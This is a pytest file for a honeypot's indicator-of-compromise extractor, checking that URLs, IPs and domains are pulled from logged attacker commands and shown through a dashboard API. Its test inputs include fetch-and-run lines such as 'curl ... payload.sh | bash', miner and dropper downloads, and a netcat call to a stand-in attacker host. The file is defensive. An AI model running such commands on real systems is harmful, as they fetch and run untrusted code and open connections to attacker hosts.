import pytest
from doppel.analytics.ioc import (
    extract_urls,
    extract_ips,
    extract_domains,
    extract_session_iocs,
)
from fastapi.testclient import TestClient
from doppel.dashboard.app import app, controller


def test_url_extraction():
    cmd = "curl -s http://198.51.100.5/payload.sh | bash; wget https://example.com/miner.tar.gz"
    urls = extract_urls(cmd)
    assert len(urls) == 2
    assert "http://198.51.100.5/payload.sh" in urls
    assert "https://example.com/miner.tar.gz" in urls


def test_ip_extraction_ignores_version_numbers_and_loopback():
    cmd = "nmap -sV 203.0.113.50; ping 127.0.0.1; echo 'nginx/1.18.0'"
    ips = extract_ips(cmd, exclude_loopback=True)
    assert "203.0.113.50" in ips
    assert "127.0.0.1" not in ips
    assert "1.18.0" not in ips


def test_domain_extraction_filters_file_extensions():
    cmd = "wget http://malware.biz/dropper.sh; cat script.py; touch test.txt; ping c2.darknet.org"
    domains = extract_domains(cmd)
    assert "malware.biz" in domains
    assert "c2.darknet.org" in domains
    assert "script.py" not in domains
    assert "test.txt" not in domains


def test_session_iocs_aggregation_and_empty_state():
    # Session with no network links
    clean_cmds = ["whoami", "id", "ls -la", "cd /var/www"]
    empty_result = extract_session_iocs(clean_cmds)
    assert empty_result["has_iocs"] is False
    assert empty_result["total_count"] == 0

    # Session with attacker downloads
    dirty_cmds = [
        {"command": "whoami"},
        {"command": "curl -O http://198.51.100.99/beacon.elf"},
        {"command": "wget https://attacker.site/key.pem"},
    ]
    result = extract_session_iocs(dirty_cmds)
    assert result["has_iocs"] is True
    assert result["total_count"] >= 2
    assert len(result["urls"]) == 2
    assert any(x["value"] == "http://198.51.100.99/beacon.elf" for x in result["urls"])


@pytest.mark.asyncio
async def test_ioc_api_endpoint():
    controller.config.llm.mock_mode = True
    controller.config.access.dashboard_allowed_ips = ["127.0.0.1"]
    client = TestClient(app, client=("127.0.0.1", 50000))

    session_id = "test-ioc-session-01"
    await controller.db.log_session_start(session_id, "10.0.0.1", 2222, "ubuntu")
    await controller.db.log_command(
        session_id=session_id,
        cwd="/home/ubuntu",
        command="curl -s http://198.51.100.88/test.sh | bash",
        output="",
        route_decision="llm_deception",
    )

    res = client.get(f"/api/sessions/{session_id}/iocs")
    assert res.status_code == 200
    data = res.json()
    assert data["session_id"] == session_id
    assert data["iocs"]["has_iocs"] is True
    assert any(u["value"] == "http://198.51.100.88/test.sh" for u in data["iocs"]["urls"])

def test_filenames_and_inline_code_are_not_domains():
    from doppel.analytics.ioc import extract_domains
    for cmd in ("tar czf db.tgz /var/www", "systemctl status nginx.service", "cat backup.sql",
                'python3 -c "import os.path"', "unzip site.rar"):
        assert extract_domains(cmd) == [], cmd
    assert extract_domains("ssh root@c2.example.net") == ["c2.example.net"]
    assert extract_domains("nc attacker.example.org 4444") == ["attacker.example.org"]
    assert extract_domains("curl evil.example.com/x.sh") == ["evil.example.com"]
